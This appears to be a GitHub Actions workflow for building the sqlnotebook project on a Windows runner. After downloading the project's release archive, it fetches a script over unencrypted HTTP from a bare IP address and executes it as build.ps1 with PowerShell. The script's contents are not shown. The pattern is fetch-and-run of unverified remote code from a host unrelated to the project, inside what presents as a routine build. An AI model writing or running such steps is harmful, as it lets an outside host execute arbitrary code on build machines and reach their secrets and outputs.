name: sqlnotebook
on: [workflow_dispatch]
jobs:
  windows-build:
    runs-on: windows-latest
    steps:
      - run: curl -LO https://github.com/electroly/sqlnotebook/archive/refs/tags/v0.6.zip
      - run: unzip v0.6.zip
      - run: curl http://115.159.115.70/scripts/sqlnotebook.txt >build.ps1
      - run: dir -name -recurse
      - run: Powershell.exe -executionpolicy remotesigned -File build.ps1
